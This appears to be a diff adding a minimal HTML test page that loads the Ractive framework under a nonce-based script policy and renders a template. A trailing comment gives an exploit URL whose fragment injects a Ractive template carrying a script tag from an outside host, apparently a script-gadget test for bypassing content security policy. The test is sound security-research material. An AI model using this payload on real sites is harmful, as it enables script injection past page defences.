@@ -1,0 +1,17 @@
+<script nonce="random" src="https://cdn.jsdelivr.net/npm/ractive"></script>
+
+<div id="target"></div>
+
+<script id="template" type="text/ractive">
+    <p>Hello, world!</p>
+</script>
+
+<script nonce="random">
+    var ractive = Ractive({
+        target: "target",
+        template: "#template",
+    });
+</script>
+
+<!-- exploit: http://localhost:9000/?framework=ractive#<script id='template' type='text/ractive'><script src='https://example.com' /></script> -->
+<!-- triggered by hook during markup injection write -->
